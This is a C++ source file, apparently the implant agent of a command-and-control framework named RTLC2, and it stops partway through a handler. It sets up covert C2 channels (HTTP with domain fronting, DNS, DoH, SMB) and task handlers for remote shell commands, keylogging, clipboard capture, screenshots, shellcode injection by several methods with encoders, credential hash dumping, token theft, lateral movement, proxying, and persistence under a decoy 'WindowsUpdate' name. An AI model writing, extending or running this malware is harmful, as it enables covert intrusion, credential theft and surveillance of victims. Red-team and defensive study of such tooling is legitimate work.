#include "agent.h"
#include "config.h"
#include "transport.h"
#include "crypto.h"
#include "evasion.h"
#include "execution.h"
#include "bof.h"
#include "jobs.h"
#include "persistence.h"
#include "shellcode_encoder.h"

#include <ctime>
#ifdef __APPLE__
#include <mach-o/dyld.h>
#include <crt_externs.h>
#endif
#ifndef RTLC2_WINDOWS
#include <unistd.h>
#endif

// Forward declarations for module functions (implemented in separate .cpp files)
// Forward declarations for clipboard/keylogger workers
namespace rtlc2 { namespace modules {
    void ClipboardMonitorLoop(JobInfo& job);
#ifdef RTLC2_WINDOWS
    std::string StartKeylogger();
    std::string StopKeylogger();
    std::string DumpKeylog();
#endif
}}

// Forward declaration for privilege escalation
namespace rtlc2 { namespace modules {
    std::string PrivEsc(const std::string& technique, const std::string& payload);
}}

namespace rtlc2 { namespace modules {
    std::string HashDump(const std::string& method);
    std::string TokenList();
    std::string TokenSteal(uint32_t pid);
    std::string TokenMake(const std::string& user, const std::string& password, const std::string& domain);
    std::string TokenRevert();
    std::string LateralMove(const std::string& method, const std::string& target,
                            const std::string& command, const std::string& extra);
    std::string PortScan(const std::string& target, const std::string& portSpec,
                         int timeout, int threads);
    std::string StartSocks5(int port);
    std::string StopSocks5();
}}

// Forward declarations for reverse port forward module
namespace rtlc2 { namespace modules {
    std::string StartRPortFwd(int bind_port, const std::string& fwd_host, int fwd_port);
    std::string StopRPortFwd(int bind_port);
    std::string ListRPortFwd();
}}

#include <cstring>
#include <cstdio>
#include <sstream>
#include <thread>
#include <chrono>
#include <memory>
#include <fstream>

#ifndef RTLC2_WINDOWS
#include <sys/stat.h>
#include <cstdlib>
#endif

// Minimal JSON helpers (no external dependency)
namespace json {

std::string escape(const std::string& s) {
    std::string out;
    for (char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default:   out += c;
        }
    }
    return out;
}

std::string to_string(const std::string& key, const std::string& value) {
    return "\"" + key + "\":\"" + escape(value) + "\"";
}

std::string to_string(const std::string& key, int value) {
    return "\"" + key + "\":" + std::to_string(value);
}

// Simple JSON parser for responses
std::string extract_string(const std::string& json_str, const std::string& key) {
    std::string search = "\"" + key + "\":\"";
    auto pos = json_str.find(search);
    if (pos == std::string::npos) return "";
    pos += search.length();
    auto end = json_str.find("\"", pos);
    if (end == std::string::npos) return "";
    return json_str.substr(pos, end - pos);
}

std::map<std::string, std::string> extract_params(const std::string& json_str) {
    std::map<std::string, std::string> params;
    auto params_pos = json_str.find("\"params\":{");
    if (params_pos == std::string::npos) return params;

    size_t start = params_pos + 9; // after "params":{
    auto end_brace = json_str.find("}", start);
    if (end_brace == std::string::npos) return params;

    std::string params_str = json_str.substr(start + 1, end_brace - start - 1);
    // Parse key:"value" pairs
    size_t pos = 0;
    while (pos < params_str.length()) {
        auto key_start = params_str.find("\"", pos);
        if (key_start == std::string::npos) break;
        auto key_end = params_str.find("\"", key_start + 1);
        if (key_end == std::string::npos) break;

        auto val_start = params_str.find("\"", key_end + 1);
        if (val_start == std::string::npos) break;
        auto val_end = params_str.find("\"", val_start + 1);
        if (val_end == std::string::npos) break;

        std::string key = params_str.substr(key_start + 1, key_end - key_start - 1);
        std::string val = params_str.substr(val_start + 1, val_end - val_start - 1);
        params[key] = val;

        pos = val_end + 1;
    }
    return params;
}

} // namespace json

namespace rtlc2 {

// Global job manager instance
static JobManager g_jobManager;

Agent::Agent(const AgentConfig& config) : config_(config), running_(false) {
    sysinfo_ = GatherSystemInfo();
    CreateTransport();
    RegisterHandlers();
}

void Agent::CreateTransport() {
    std::string type = RTLC2_TRANSPORT_TYPE;
    std::string frontDomain = RTLC2_FRONT_DOMAIN;

    if (type == "tcp") {
        transport_ = std::make_unique<transport::TCPTransport>(
            config_.c2_host, config_.c2_port, config_.use_tls);
    } else if (type == "dns") {
        // DNS transport: c2_host is the C2 domain, use system DNS resolver
        // c2_port is repurposed as DNS port (default 53)
        std::string dnsServer = "8.8.8.8";
        transport_ = std::make_unique<transport::DNSTransport>(
            config_.c2_host, dnsServer, config_.c2_port ? config_.c2_port : 53);
    } else if (type == "doh") {
        std::string dohResolver = RTLC2_DOH_RESOLVER;
        transport_ = std::make_unique<transport::DoHTransport>(
            dohResolver, config_.c2_host, "", config_.c2_port);
#ifdef RTLC2_WINDOWS
    } else if (type == "smb") {
        transport_ = std::make_unique<transport::SMBTransport>(
            config_.c2_host, false);
#endif
    } else {
        // Default: HTTP
        auto http = std::make_unique<transport::HTTPTransport>(
            config_.c2_host, config_.c2_port, config_.use_tls, config_.user_agent);
        if (!frontDomain.empty()) {
            http->SetFrontDomain(frontDomain);
        }
        transport_ = std::move(http);
    }

    transport_->Connect();
}

Agent::~Agent() {
    Stop();
}

void Agent::RegisterHandlers() {
    handlers_[TaskType::Shell] = [](const Task& t) -> TaskResult {
        std::string cmd(t.data.begin(), t.data.end());
        std::string output = modules::ExecuteShell(cmd);
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
    };

    handlers_[TaskType::PS] = [](const Task& t) -> TaskResult {
        std::string output = modules::GetProcessList();
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
    };

    handlers_[TaskType::LS] = [](const Task& t) -> TaskResult {
        std::string path = t.data.empty() ? "." : std::string(t.data.begin(), t.data.end());
        std::string output = modules::ListDirectory(path);
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
    };

    handlers_[TaskType::CD] = [](const Task& t) -> TaskResult {
        std::string path(t.data.begin(), t.data.end());
        bool ok = modules::ChangeDir(path);
        std::string out = ok ? "Changed directory to: " + path : "Failed to change directory";
        return {t.task_id, ok ? 2 : 3, std::vector<uint8_t>(out.begin(), out.end())};
    };

    handlers_[TaskType::PWD] = [](const Task& t) -> TaskResult {
        std::string output = modules::GetCurrentDir();
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
    };

    handlers_[TaskType::Whoami] = [](const Task& t) -> TaskResult {
        std::string output = modules::GetWhoami();
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
    };

    handlers_[TaskType::IPConfig] = [](const Task& t) -> TaskResult {
        std::string output = modules::GetIPConfig();
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
    };

    handlers_[TaskType::Sleep] = [this](const Task& t) -> TaskResult {
        if (!t.data.empty()) {
            std::string s(t.data.begin(), t.data.end());
            int interval = std::atoi(s.c_str());
            if (interval > 0) {
                config_.sleep_interval = interval;
            }
        }
        auto it = t.params.find("jitter");
        if (it != t.params.end()) {
            int j = std::atoi(it->second.c_str());
            if (j >= 0 && j <= 100) config_.jitter = j;
        }
        std::string msg = "Sleep set to " + std::to_string(config_.sleep_interval) + "s, jitter " + std::to_string(config_.jitter) + "%";
        return {t.task_id, 2, std::vector<uint8_t>(msg.begin(), msg.end())};
    };

    handlers_[TaskType::Exit] = [this](const Task& t) -> TaskResult {
        running_ = false;
        std::string msg = "Agent exiting";
        return {t.task_id, 2, std::vector<uint8_t>(msg.begin(), msg.end())};
    };

    handlers_[TaskType::SelfDestruct] = [this](const Task& t) -> TaskResult {
        std::string msg = "Self-destruct initiated";
        SelfDestruct();
        return {t.task_id, 2, std::vector<uint8_t>(msg.begin(), msg.end())};
    };

    handlers_[static_cast<TaskType>(2)] = [](const Task& t) -> TaskResult {
        auto it = t.params.find("path");
        std::string path = (it != t.params.end()) ? it->second : "/tmp/upload";
        FILE* f = fopen(path.c_str(), "wb");
        if (!f) {
            std::string msg = "Upload failed: cannot write to " + path;
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }
        fwrite(t.data.data(), 1, t.data.size(), f);
        fclose(f);
        std::string msg = "Uploaded " + std::to_string(t.data.size()) + " bytes to " + path;
        return {t.task_id, 2, std::vector<uint8_t>(msg.begin(), msg.end())};
    };

    handlers_[static_cast<TaskType>(3)] = [](const Task& t) -> TaskResult {
        std::string path(t.data.begin(), t.data.end());
        FILE* f = fopen(path.c_str(), "rb");
        if (!f) {
            std::string msg = "Download failed: " + path + " not found";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }
        fseek(f, 0, SEEK_END);
        long size = ftell(f);
        fseek(f, 0, SEEK_SET);
        std::vector<uint8_t> data(size);
        fread(data.data(), 1, size, f);
        fclose(f);
        return {t.task_id, 2, data};
    };

    handlers_[static_cast<TaskType>(9)] = [](const Task& t) -> TaskResult {
#ifdef RTLC2_WINDOWS
        // Windows: GDI screen capture to BMP
        {
            int w = GetSystemMetrics(SM_CXSCREEN);
            int h = GetSystemMetrics(SM_CYSCREEN);
            HDC hScreen = GetDC(NULL);
            HDC hDC = CreateCompatibleDC(hScreen);
            HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
            HGDIOBJ hOld = SelectObject(hDC, hBitmap);
            BitBlt(hDC, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);

            // Build BMP file in memory
            BITMAPINFOHEADER bih = {};
            bih.biSize = sizeof(BITMAPINFOHEADER);
            bih.biWidth = w;
            bih.biHeight = -h; // top-down
            bih.biPlanes = 1;
            bih.biBitCount = 24;
            bih.biCompression = BI_RGB;
            int stride = ((w * 3 + 3) & ~3);
            DWORD imageSize = stride * h;
            bih.biSizeImage = imageSize;

            BITMAPFILEHEADER bfh = {};
            bfh.bfType = 0x4D42; // 'BM'
            bfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imageSize;
            bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

            std::vector<uint8_t> pixels(imageSize);
            BITMAPINFO bi = {};
            bi.bmiHeader = bih;
            bi.bmiHeader.biHeight = h; // GetDIBits needs positive height
            GetDIBits(hDC, hBitmap, 0, h, pixels.data(), &bi, DIB_RGB_COLORS);

            std::vector<uint8_t> bmpData;
            bmpData.resize(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imageSize);
            memcpy(bmpData.data(), &bfh, sizeof(bfh));
            memcpy(bmpData.data() + sizeof(bfh), &bih, sizeof(bih));
            memcpy(bmpData.data() + sizeof(bfh) + sizeof(bih), pixels.data(), imageSize);

            SelectObject(hDC, hOld);
            DeleteObject(hBitmap);
            DeleteDC(hDC);
            ReleaseDC(NULL, hScreen);

            return {t.task_id, 2, bmpData};
        }
#elif defined(RTLC2_MACOS)
        system("screencapture -x /tmp/.rtlc2_sc.png 2>/dev/null");
        FILE* f = fopen("/tmp/.rtlc2_sc.png", "rb");
        if (f) {
            fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
            std::vector<uint8_t> data(sz);
            fread(data.data(), 1, sz, f);
            fclose(f); remove("/tmp/.rtlc2_sc.png");
            return {t.task_id, 2, data};
        }
#elif defined(RTLC2_LINUX)
        system("import -window root /tmp/.rtlc2_sc.png 2>/dev/null || scrot /tmp/.rtlc2_sc.png 2>/dev/null");
        FILE* f = fopen("/tmp/.rtlc2_sc.png", "rb");
        if (f) {
            fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
            std::vector<uint8_t> data(sz);
            fread(data.data(), 1, sz, f);
            fclose(f); remove("/tmp/.rtlc2_sc.png");
            return {t.task_id, 2, data};
        }
#endif
        std::string msg = "Screenshot not available on this platform";
        return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
    };

    // Clipboard monitor
    handlers_[TaskType::Clipboard] = [](const Task& t) -> TaskResult {
        std::string args(t.data.begin(), t.data.end());
        if (args.find("stop") != std::string::npos) {
            // Stop all clipboard jobs
            auto jobList = g_jobManager.ListJobs();
            for (auto& j : jobList) {
                if (j.second.find("Clipboard") != std::string::npos) {
                    g_jobManager.StopJob(j.first);
                }
            }
            std::string msg = "Clipboard monitor stopped";
            return {t.task_id, 2, std::vector<uint8_t>(msg.begin(), msg.end())};
        }
        // Start clipboard monitor as background job
        std::string jobId = g_jobManager.StartJob(JobType::ClipboardMonitor, "Clipboard Monitor",
            [](JobInfo& job) { modules::ClipboardMonitorLoop(job); });
        std::string msg = "Clipboard monitor started (job " + jobId + ")";
        return {t.task_id, 2, std::vector<uint8_t>(msg.begin(), msg.end())};
    };

    // Registry write/delete/create
    handlers_[TaskType::RegWrite] = [](const Task& t) -> TaskResult {
        std::string args(t.data.begin(), t.data.end());
#ifdef RTLC2_WINDOWS
        // Parse: subcommand hive\key valuename data [type]
        // Subcommands: write, delete, createkey
        auto subcmd = t.params.find("action");
        std::string action = (subcmd != t.params.end()) ? subcmd->second : "write";

        // Forward to the appropriate registry function via shell
        // The actual implementation is in registry_write.cpp
        extern std::string RegistryWriteCommand(const std::string& action, const std::string& args);
        std::string output = RegistryWriteCommand(action, args);
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
#else
        std::string msg = "Registry operations only available on Windows";
        return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
#endif
    };

    // Service control
    handlers_[TaskType::ServiceCtl] = [](const Task& t) -> TaskResult {
        std::string args(t.data.begin(), t.data.end());
#ifdef RTLC2_WINDOWS
        auto subcmd = t.params.find("action");
        std::string action = (subcmd != t.params.end()) ? subcmd->second : "list";

        extern std::string ServiceCommand(const std::string& action, const std::string& args);
        std::string output = ServiceCommand(action, args);
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
#else
        std::string msg = "Service control only available on Windows";
        return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
#endif
    };

    // Job management
    handlers_[TaskType::Jobs] = [](const Task& t) -> TaskResult {
        std::string args(t.data.begin(), t.data.end());
        if (args.find("kill") != std::string::npos || args.find("stop") != std::string::npos) {
            // Extract job ID
            auto space = args.rfind(' ');
            if (space != std::string::npos) {
                std::string jobId = args.substr(space + 1);
                bool ok = g_jobManager.StopJob(jobId);
                std::string msg = ok ? "Job " + jobId + " stopped" : "Job " + jobId + " not found";
                return {t.task_id, ok ? 2 : 3, std::vector<uint8_t>(msg.begin(), msg.end())};
            }
        }
        // List jobs
        std::string output = g_jobManager.FormatJobList();
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
    };

    // --- .NET Assembly Execution (TaskType::Assembly = 8) ---
    handlers_[TaskType::Assembly] = [](const Task& t) -> TaskResult {
#ifdef RTLC2_WINDOWS
        auto argsIt = t.params.find("args");
        auto forkIt = t.params.find("fork");
        auto spawnIt = t.params.find("spawn_to");
        std::string args = argsIt != t.params.end() ? argsIt->second : "";
        bool useFork = forkIt != t.params.end() && forkIt->second == "1";
        std::string spawnTo = spawnIt != t.params.end() ? spawnIt->second : RTLC2_SPAWN_TO;

        if (useFork) {
            // Fork-and-run: create sacrificial process, inject, wait for output
            void* hProc = nullptr;
            void* hThread = nullptr;
            uint32_t childPid = 0;
            if (evasion::CreateProcessWithPPID(0, spawnTo.c_str(), &hProc, &hThread, &childPid)) {
                bool injected = evasion::injection::InjectNtCreateSection(childPid, t.data.data(), t.data.size());
                if (hThread) {
                    ResumeThread((HANDLE)hThread);
                    WaitForSingleObject((HANDLE)hProc, 30000);
                    CloseHandle((HANDLE)hThread);
                }
                if (hProc) CloseHandle((HANDLE)hProc);
                std::string msg = injected ? "Fork-and-run assembly executed (pid: " + std::to_string(childPid) + ")"
                                           : "Fork-and-run injection failed";
                return {t.task_id, injected ? 2 : 3, std::vector<uint8_t>(msg.begin(), msg.end())};
            }
            std::string msg = "Fork-and-run: failed to create sacrificial process";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }

        auto result = execution::ExecuteAssembly(t.data, args);
        return {t.task_id, result.success ? 2 : 3,
                std::vector<uint8_t>(result.output.begin(), result.output.end())};
#else
        std::string msg = "Assembly execution only available on Windows";
        return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
#endif
    };

    // --- Keylogger (TaskType::Keylog = 10) ---
    handlers_[TaskType::Keylog] = [](const Task& t) -> TaskResult {
        std::string args(t.data.begin(), t.data.end());
        if (args.find("stop") != std::string::npos) {
            auto jobList = g_jobManager.ListJobs();
            for (auto& j : jobList) {
                // j is pair<string,string> - id and description
                if (j.second.find("Keylog") != std::string::npos) {
                    g_jobManager.StopJob(j.first);
                }
            }
            std::string msg = "Keylogger stopped";
            return {t.task_id, 2, std::vector<uint8_t>(msg.begin(), msg.end())};
        }
        if (args.find("dump") != std::string::npos || args.find("output") != std::string::npos) {
            // Dump current keylogger output
            auto jobList = g_jobManager.ListJobs();
            std::string output;
            for (auto& j : jobList) {
                if (j.second.find("Keylog") != std::string::npos) {
                    output = g_jobManager.GetJobOutput(j.first);
                    break;
                }
            }
            if (output.empty()) output = "No keylogger output (is it running?)";
            return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
        }
        // Start keylogger as background job
        std::string jobId = g_jobManager.StartJob(JobType::Keylogger, "Keylogger",
            [](JobInfo& job) {
#ifdef RTLC2_WINDOWS
                modules::StartKeylogger();
                // Wait until job is stopped
                while (job.running.load()) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(500));
                    std::string dump = modules::DumpKeylog();
                    if (!dump.empty()) {
                        job.AppendOutput(dump);
                    }
                }
                modules::StopKeylogger();
#else
                (void)job;
#endif
            });
        std::string msg = "Keylogger started (job " + jobId + ")";
        return {t.task_id, 2, std::vector<uint8_t>(msg.begin(), msg.end())};
    };

    // --- Process Injection (TaskType::Inject = 6) ---
    handlers_[TaskType::Inject] = [](const Task& t) -> TaskResult {
#ifdef RTLC2_WINDOWS
        auto pidIt = t.params.find("pid");
        auto methodIt = t.params.find("method");
        auto tidIt = t.params.find("tid");
        auto dllIt = t.params.find("dll");
        auto funcIt = t.params.find("func");

        if (t.data.empty()) {
            std::string msg = "Inject: no shellcode provided";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }

        uint32_t pid = pidIt != t.params.end() ? (uint32_t)std::atoi(pidIt->second.c_str()) : 0;
        std::string method = methodIt != t.params.end() ? methodIt->second : "crt";

        // Encoder integration: optionally encode shellcode before injection
        auto encoderIt = t.params.find("encoder");
        std::vector<uint8_t> shellcodeData = t.data;
        if (encoderIt != t.params.end() && encoderIt->second != "none" && !encoderIt->second.empty()) {
            std::string enc = encoderIt->second;
            if (enc == "xor") {
                shellcodeData = crypto::EncodeShellcode(t.data, crypto::EncoderType::XOR_ROLLING);
            } else if (enc == "aes") {
                shellcodeData = crypto::EncodeShellcode(t.data, crypto::EncoderType::AES_CTR);
            } else if (enc == "rc4") {
                shellcodeData = crypto::EncodeShellcode(t.data, crypto::EncoderType::RC4_STREAM);
            } else if (enc == "chain") {
                shellcodeData = crypto::EncodeShellcodeChain(t.data,
                    {crypto::EncoderType::XOR_ROLLING, crypto::EncoderType::AES_CTR});
            }
        }
        const uint8_t* sc = shellcodeData.data();
        size_t scLen = shellcodeData.size();

        bool ok = false;
        if (method == "crt") {
            ok = evasion::injection::InjectCreateRemoteThread(pid, sc, scLen);
        } else if (method == "apc") {
            ok = evasion::injection::InjectAPC(pid, sc, scLen);
        } else if (method == "hollow") {
            std::string target = pidIt != t.params.end() ? pidIt->second : "C:\\Windows\\System32\\svchost.exe";
            ok = evasion::injection::ProcessHollow(target.c_str(), sc, scLen);
        } else if (method == "earlybird") {
            std::string target = pidIt != t.params.end() ? pidIt->second : "C:\\Windows\\System32\\svchost.exe";
            ok = evasion::injection::EarlyBirdInject(target.c_str(), sc, scLen);
        } else if (method == "hijack") {
            uint32_t tid = tidIt != t.params.end() ? (uint32_t)std::atoi(tidIt->second.c_str()) : 0;
            ok = evasion::injection::InjectThreadHijack(pid, tid, sc, scLen);
        } else if (method == "section") {
            ok = evasion::injection::InjectNtCreateSection(pid, sc, scLen);
        } else if (method == "poolparty") {
            ok = evasion::injection::InjectPoolParty(pid, sc, scLen);
        } else if (method == "threadless") {
            std::string dll = dllIt != t.params.end() ? dllIt->second : "kernel32.dll";
            std::string func = funcIt != t.params.end() ? funcIt->second : "Sleep";
            ok = evasion::injection::ThreadlessInject(pid, sc, scLen, dll.c_str(), func.c_str());
        } else {
            std::string msg = "Unknown injection method: " + method +
                ". Available: crt, apc, hollow, earlybird, hijack, section, poolparty, threadless";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }

        std::string msg = ok ? "Injection successful (method: " + method + ", pid: " + std::to_string(pid) + ")"
                             : "Injection failed (method: " + method + ", pid: " + std::to_string(pid) + ")";
        return {t.task_id, ok ? 2 : 3, std::vector<uint8_t>(msg.begin(), msg.end())};
#else
        std::string msg = "Process injection only available on Windows";
        return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
#endif
    };

    // --- Credential Dumping (TaskType::HashDump = 17) ---
    handlers_[TaskType::HashDump] = [](const Task& t) -> TaskResult {
#ifdef RTLC2_WINDOWS
        auto methodIt = t.params.find("method");
        std::string method = methodIt != t.params.end() ? methodIt->second : "sam";
        std::string output = modules::HashDump(method);
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
#else
        std::string msg = "Credential dumping only available on Windows";
        return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
#endif
    };

    // --- Token Manipulation (TaskType::Token = 18) ---
    handlers_[TaskType::Token] = [](const Task& t) -> TaskResult {
#ifdef RTLC2_WINDOWS
        auto actionIt = t.params.find("action");
        std::string action = actionIt != t.params.end() ? actionIt->second : "list";

        std::string output;
        if (action == "list") {
            output = modules::TokenList();
        } else if (action == "steal") {
            auto pidIt = t.params.find("pid");
            uint32_t pid = pidIt != t.params.end() ? (uint32_t)std::atoi(pidIt->second.c_str()) : 0;
            output = modules::TokenSteal(pid);
        } else if (action == "make") {
            auto userIt = t.params.find("user");
            auto passIt = t.params.find("pass");
            auto domainIt = t.params.find("domain");
            std::string user = userIt != t.params.end() ? userIt->second : "";
            std::string pass = passIt != t.params.end() ? passIt->second : "";
            std::string domain = domainIt != t.params.end() ? domainIt->second : ".";
            output = modules::TokenMake(user, pass, domain);
        } else if (action == "revert") {
            output = modules::TokenRevert();
        } else {
            output = "Unknown token action: " + action + ". Available: list, steal, make, revert";
        }
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
#else
        std::string msg = "Token manipulation only available on Windows";
        return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
#endif
    };

    // --- Lateral Movement (TaskType::Pivot = 19) ---
    handlers_[TaskType::Pivot] = [](const Task& t) -> TaskResult {
#ifdef RTLC2_WINDOWS
        auto methodIt = t.params.find("method");
        auto targetIt = t.params.find("target");
        auto extraIt = t.params.find("extra");
        std::string method = methodIt != t.params.end() ? methodIt->second : "psexec";
        std::string target = targetIt != t.params.end() ? targetIt->second : "";
        std::string command(t.data.begin(), t.data.end());
        std::string extra = extraIt != t.params.end() ? extraIt->second : "";

        if (target.empty()) {
            std::string msg = "Pivot: target host required";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }

        std::string output = modules::LateralMove(method, target, command, extra);
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
#else
        std::string msg = "Lateral movement only available on Windows";
        return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
#endif
    };

    // --- Port Scanning (TaskType::PortScan = 20) ---
    handlers_[TaskType::PortScan] = [](const Task& t) -> TaskResult {
        auto portsIt = t.params.find("ports");
        auto timeoutIt = t.params.find("timeout");
        auto threadsIt = t.params.find("threads");
        std::string target(t.data.begin(), t.data.end());
        std::string ports = portsIt != t.params.end() ? portsIt->second : "21,22,80,443,445,3389,8080";
        int timeout = timeoutIt != t.params.end() ? std::atoi(timeoutIt->second.c_str()) : 1000;
        int threads = threadsIt != t.params.end() ? std::atoi(threadsIt->second.c_str()) : 10;

        if (target.empty()) {
            std::string msg = "PortScan: target required (IP or CIDR)";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }

        std::string output = modules::PortScan(target, ports, timeout, threads);
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
    };

    // --- SOCKS5 Proxy (TaskType::Socks = 21) ---
    handlers_[TaskType::Socks] = [](const Task& t) -> TaskResult {
        auto actionIt = t.params.find("action");
        auto portIt = t.params.find("port");
        std::string action = actionIt != t.params.end() ? actionIt->second : "start";
        int port = portIt != t.params.end() ? std::atoi(portIt->second.c_str()) : 1080;

        std::string output;
        if (action == "start") {
            output = modules::StartSocks5(port);
        } else if (action == "stop") {
            output = modules::StopSocks5();
        } else if (action == "list") {
            output = g_jobManager.FormatJobList();
        } else {
            output = "Unknown socks action: " + action + ". Available: start, stop, list";
        }
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
    };

    // --- Dynamic Module Execution (TaskType::Module = 23) ---
    handlers_[TaskType::Module] = [](const Task& t) -> TaskResult {
        auto actionIt = t.params.find("action");
        std::string action = actionIt != t.params.end() ? actionIt->second : "shellcode";

#ifdef RTLC2_WINDOWS
        if (action == "pe") {
            auto argsIt = t.params.find("args");
            auto forkIt = t.params.find("fork");
            auto spawnIt = t.params.find("spawn_to");
            std::string args = argsIt != t.params.end() ? argsIt->second : "";
            bool useFork = forkIt != t.params.end() && forkIt->second == "1";
            std::string spawnTo = spawnIt != t.params.end() ? spawnIt->second : RTLC2_SPAWN_TO;

            if (useFork) {
                void* hProc = nullptr;
                void* hThread = nullptr;
                uint32_t childPid = 0;
                if (evasion::CreateProcessWithPPID(0, spawnTo.c_str(), &hProc, &hThread, &childPid)) {
                    bool injected = evasion::injection::InjectNtCreateSection(childPid, t.data.data(), t.data.size());
                    if (hThread) {
                        ResumeThread((HANDLE)hThread);
                        WaitForSingleObject((HANDLE)hProc, 30000);
                        CloseHandle((HANDLE)hThread);
                    }
                    if (hProc) CloseHandle((HANDLE)hProc);
                    std::string msg = injected ? "Fork-and-run PE executed (pid: " + std::to_string(childPid) + ")"
                                               : "Fork-and-run injection failed";
                    return {t.task_id, injected ? 2 : 3, std::vector<uint8_t>(msg.begin(), msg.end())};
                }
                std::string msg = "Fork-and-run: failed to create sacrificial process";
                return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
            }

            auto result = execution::ExecutePE(t.data, args, false);
            return {t.task_id, result.success ? 2 : 3,
                    std::vector<uint8_t>(result.output.begin(), result.output.end())};
        } else if (action == "assembly") {
            auto argsIt = t.params.find("args");
            std::string args = argsIt != t.params.end() ? argsIt->second : "";
            auto result = execution::ExecuteAssembly(t.data, args);
            return {t.task_id, result.success ? 2 : 3,
                    std::vector<uint8_t>(result.output.begin(), result.output.end())};
        } else if (action == "shellcode") {
            // Encoder integration for shellcode
            auto encoderIt = t.params.find("encoder");
            std::vector<uint8_t> scData = t.data;
            if (encoderIt != t.params.end() && encoderIt->second != "none" && !encoderIt->second.empty()) {
                std::string enc = encoderIt->second;
                if (enc == "xor") {
                    scData = crypto::EncodeShellcode(t.data, crypto::EncoderType::XOR_ROLLING);
                } else if (enc == "aes") {
                    scData = crypto::EncodeShellcode(t.data, crypto::EncoderType::AES_CTR);
                } else if (enc == "rc4") {
                    scData = crypto::EncodeShellcode(t.data, crypto::EncoderType::RC4_STREAM);
                } else if (enc == "chain") {
                    scData = crypto::EncodeShellcodeChain(t.data,
                        {crypto::EncoderType::XOR_ROLLING, crypto::EncoderType::AES_CTR});
                }
            }
            bool ok = execution::ExecuteShellcode(scData.data(), scData.size(), true);
            std::string msg = ok ? "Shellcode executed" : "Shellcode execution failed";
            return {t.task_id, ok ? 2 : 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }
#else
        if (action == "shellcode") {
            bool ok = execution::ExecuteShellcodeCrossPlatform(t.data.data(), t.data.size());
            std::string msg = ok ? "Shellcode executed" : "Shellcode execution failed";
            return {t.task_id, ok ? 2 : 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }
#endif

        std::string msg = "Unknown module action: " + action + ". Available: pe, assembly, shellcode";
        return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
    };

    // --- Persistence (TaskType::Persist = 28) ---
    handlers_[TaskType::Persist] = [](const Task& t) -> TaskResult {
        auto techIt = t.params.find("technique");
        auto nameIt = t.params.find("name");
        auto pathIt = t.params.find("path");
        auto argsIt = t.params.find("args");
        auto hklmIt = t.params.find("hklm");

        persistence::PersistConfig cfg;
        cfg.technique = static_cast<persistence::Technique>(
            techIt != t.params.end() ? std::atoi(techIt->second.c_str()) : 0);
        cfg.name = nameIt != t.params.end() ? nameIt->second : "WindowsUpdate";
        cfg.payload_path = pathIt != t.params.end() ? pathIt->second : "";
        cfg.args = argsIt != t.params.end() ? argsIt->second : "";
        cfg.hklm = hklmIt != t.params.end() && hklmIt->second == "1";

        auto result = persistence::Install(cfg);
        return {t.task_id, result.success ? 2 : 3,
                std::vector<uint8_t>(result.message.begin(), result.message.end())};
    };

    // --- Remove Persistence (TaskType::Unpersist = 29) ---
    handlers_[TaskType::Unpersist] = [](const Task& t) -> TaskResult {
        auto techIt = t.params.find("technique");
        auto nameIt = t.params.find("name");
        auto pathIt = t.params.find("path");

        persistence::PersistConfig cfg;
        cfg.technique = static_cast<persistence::Technique>(
            techIt != t.params.end() ? std::atoi(techIt->second.c_str()) : 0);
        cfg.name = nameIt != t.params.end() ? nameIt->second : "";
        cfg.payload_path = pathIt != t.params.end() ? pathIt->second : "";

        if (t.data.empty() && cfg.name.empty()) {
            // List installed persistence
            std::string list = persistence::ListInstalled();
            return {t.task_id, 2, std::vector<uint8_t>(list.begin(), list.end())};
        }

        auto result = persistence::Remove(cfg);
        return {t.task_id, result.success ? 2 : 3,
